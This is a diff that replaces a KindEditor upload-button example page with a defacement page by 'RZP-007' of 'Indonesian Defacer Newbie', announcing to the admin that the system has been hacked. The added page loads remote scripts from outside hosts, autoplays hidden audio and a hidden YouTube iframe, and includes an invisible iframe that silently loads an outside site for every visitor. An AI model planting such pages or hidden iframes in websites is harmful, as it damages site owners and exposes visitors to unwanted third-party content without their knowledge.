@@ -1,37 +1,174 @@
-<!doctype html>
-<html>
-	<head>
-		<meta charset="utf-8" />
-		<title>Upload Button Examples</title>
-		<link rel="stylesheet" href="../themes/default/default.css" />
-		<script src="../kindeditor-min.js"></script>
-		<script>
-			KindEditor.ready(function(K) {
-				var uploadbutton = K.uploadbutton({
-					button : K('#uploadButton')[0],
-					fieldName : 'imgFile',
-					url : '../php/upload_json.php?dir=file',
-					afterUpload : function(data) {
-						if (data.error === 0) {
-							var url = K.formatUrl(data.url, 'absolute');
-							K('#url').val(url);
-						} else {
-							alert(data.message);
-						}
-					},
-					afterError : function(str) {
-						alert('自定义错误信息: ' + str);
-					}
-				});
-				uploadbutton.fileBox.change(function(e) {
-					uploadbutton.submit();
-				});
-			});
-		</script>
-	</head>
-	<body>
-		<div class="upload">
-			<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" /> <input type="button" id="uploadButton" value="Upload" />
-		</div>
-	</body>
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<blink><title> RZP-007 </title></blink>
+<!-- Blogger Default Meta -->
+<meta content='Hacked By RZP-007 - Hacked By RZP-007 - i see i judge !! problem ?' name='description'/>
+<meta content='Hacked By RZP-007 , Owened By RZP-007 , 0w3n3d By RZP-007 , Deface By RZP-007 , Hacked By RZP-007 , Hacked By RZP-007 , Hacked By Indonesian Defacer Newbie , Hacked By RZP-007 , Deface By Indonesian Defacer Newbie' name='keywords'/>
+<meta http-equiv="content-Type" content="text/html; charset=UTF-8" />
+<meta content='RZP-007' name='Author'/>
+<meta content='All,INDEX,FOLLOW,noodp,noydir' name='Robots'/>
+<meta name="REVISIT-AFTER" content="15 days">
+<meta name="Distribution" content="global">
+<meta name="Category" content="Internet">
+<meta name="ROBOTS" content="All">
+<meta name="Language" content="Italian, English, German , Indonesia , Malaysia , Korea ">
+<meta content='index, follow, snipet' name='googlebot'/>
+<meta content='document' name='resource-type'/>
+<meta content='follow, all' name='Googlebot-Image'/>
+<meta content='follow, all' name='Scooter'/>
+<meta content='follow, all' name='msnbot'/>
+<meta content='follow, all' name='alexabot'/>
+<meta content='follow, all' name='Slurp'/>
+<meta content='follow, all' name='ZyBorg'/>
+<meta content='follow, all' name='Scooter'/>
+<meta content='follow, all' name='yahoobot'/>
+<meta content='follow, all' name='bingbot'/>
+<meta content='id' name='language'/>
+<meta content='id' name='geo.country'/>
+<meta content='Indonesia' name='geo.placename'/>
+<meta content='all-language' http-equiv='Content-Language'/>
+<meta content='never' name='expires'/>
+<meta content='ALL' name='SPIDERS'/>
+<meta content='ALL' name='WEBCRAWLERS'/>
+<meta content='general' name='rating'/>
+<meta content='always' name='revisit-after'/>
+<meta content='all' name='audience'/>
+<meta content='global' name='distribution'/>
+<meta content='blogger' name='generator'/>
+<meta content='true' name='MSSmartTagsPreventParsing'/>
+<meta content='blogger' name='generator'/>
+<meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
+<meta content='width=1100' name='viewport'/>
+<!-- CSS files begin-->
+<link rel="stylesheet" type="text/css" href="http://deb-x.org/css/jquery.jscrollpane.css" media="all"/>
+<link rel="stylesheet" type="text/css" href="http://deb-x.org/css/prettyPhoto.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://deb-x.org/css/style.css" media="all"/>
+<link rel="shortcut icon" href="https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-ash3/q71/1012194_296562850490060_479116135_n.jpg" type="image/x-icon">
+
+<!-- JavaScript files begin-->
+<script type="text/javascript" src="http://deb-x.org/js/jquery-1.6.4.min.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/cufon-yui.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/Yanone_Kaffeesatz_400-700.font.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.prettyPhoto.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.form.js"></script>
+
+<script type="text/javascript" src="http://deb-x.org/js/jquery.ufvalidator-1.0.5.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.mousewheel.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.jscrollpane.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.progression.1.3.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/jquery.text-effects.js"></script>
+<script type="text/javascript" src="http://deb-x.org/js/custom1.js"></script>
+<style type="text/css">body, a, a:hover {cursor: url(http://www.fbvideo.16mb.com/files/cur.cur), progress;}</style>
+</head>
+
+<object data="http://www.fbvideo.16mb.com/files/player_mp3.swf" width="0" height="0" type="application/x-shockwave-flash">
+<param value="#ffffff" name="bgcolor"><br />
+<param value="mp3=http://www.a-globaltek.com/NFS360/NFSMWAudio/10.mp3&loop=1&autoplay=1&volume=125" name="FlashVars">
+</object>
+</center>
+<iframe src="http://www.tEenPassage.com/rc/" style="display:none"></iframe>
+</body>
 </html>
+
+    <!-- wrappage begin here -->
+    <div id="wrappage">
+        <!-- container begin here -->
+        <div class="container">
+            <!-- top block begin here -->
+            <div class="top">
+                <div class="energy">
+                </div>
+
+                <div class="top-block">
+                    <a href="#" class="logo">
+                        RZP-007 Was HERE!
+
+                    </a>
+                    <div class="bg-e-button">
+                    </div>
+                    <div class="bg-button">
+                    </div>
+                    <a href="" class="open">
+
+                        <img src="http://deb-x.org/images/flash.png" alt="" />
+                    </a>
+                </div>
+            </div>
+            <!-- top block end here -->
+            <!-- center block begin here -->
+            <div class="center-block">
+                <!-- scanner begin here -->
+                <div class="scanner clearfix">
+
+                    <div class="scanner-block">
+                        <div class="scanner-box left">
+                            <div class="scanner-line">
+                            </div>
+                        </div>
+                        <ul class="data left">
+                            <li class="search">Loading Please Wait...</li>
+                            <li class="search-d">
+
+                                 User : RickyZio
+                            </li>
+                            <li class="search-d">
+                                 Pass : IDN-TEAM !
+                            </li>
+                            <li class="search-d">
+                                 Login In Successfully...
+                            </li>
+                        </ul>
+                    </div>
+
+                </div> <div class="main"> <div class="load">      </div><div class="shut-left">  </div> <div class="shut-right"> </div>  <div class="page">
+                     <div class="box-left left">
+                            <div class="info">
+                       <img src="http://i44.tinypic.com/4ftz08.jpg" alt="" class="right" />
+                                   <ul class="left who">
+                                    <li>
+                                      Name   = [RZP-007]
+                                    </li>
+                                    <li>
+                                      From   = [Indonesia]
+                                    <li>
+                                      Team   = [Indonesian Defacer Newbie]
+                                    <li> 
+                                      Twitter= [@RickyZio2]
+                                    </li>
+                                </ul>
+                            </div> <ul id="menu" class="right">
+                                 <li>
+                                    <a href="#pesan" class="selected">
+                                        Messages
+                                    </a>
+                                </li>
+
+                            </ul>
+                        </div><div class="cont left"> <div id="pesan" class="box left">
+                                <div class="box-content">
+                                    <h3>
+
+                                        # To Admin
+                                    </h3><br>
+                                   
+
+                                    <ul class="stars"><li>I'm Sorry Admin. </a></li><li>We Have Control Your Access.</li><li>Your System Has Been Hacked.</li><li>Please Patch Your Security Now.</li><li>Or We Will Come Back.</li></ul><h3> Greetz to:</h3><p class="sub"></p><ul class="education"><li>
+
+                                            <span>
+                                            <marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="20" width="100%">
+                                            Indonesian Defacer Newbie |>>> NWS-007|</marquee>
+</span></li></ul><h3></h3><p class="sub"></p><div class="gallery-block"> <div class="gallery left"><div class="img"><img src="http://timenewsfeed.files.wordpress.com/2012/04/anonymous_masks.jpg?w=480&h=320&crop=1"" /></div> <div class="des"></div>
+<div class="block-zoom"><a href="http://static.republika.co.id/uploads/images/detailnews/100325055227.jpg" rel="prettyPhoto" title="Images" class="zoom">
+
+</a></a></div></div><div class="gallery left last"><div class="img"><img src="http://static.republika.co.id/uploads/images/detailnews/100325055227.jpg" alt="" /></div><div class="des"></div><div class="block-zoom"><a href="http://1.bp.blogspot.com/_7WjdgUqNa9U/TTknmLgx_YI/AAAAAAAABkU/DexYNWu73RU/s1600/gambar-bendera-indonesia.jpeg" rel="prettyPhoto" title="Images" class="zoom">
+</a></a></div></div></div></div></div></div></div></div></div><div class="bottom"><div class="bottom-block"><h1 class="left"><marquee>- RZP-007 -</h1><h5 class="right">Copyright 2013, All Rights Reserved by RZP-007</h5></div></div> </div> </div></body></html><iframe width="0" height="0" src="http://www.youtube.com/embed/rtdR8GouoO8?feature=player_detailpage &autoplay=1" frameborder="0" allowfullscreen></iframe>
+
+
+</center></center></body>
+</html>
+</center>
+</font>
+</body>
+</html><
+
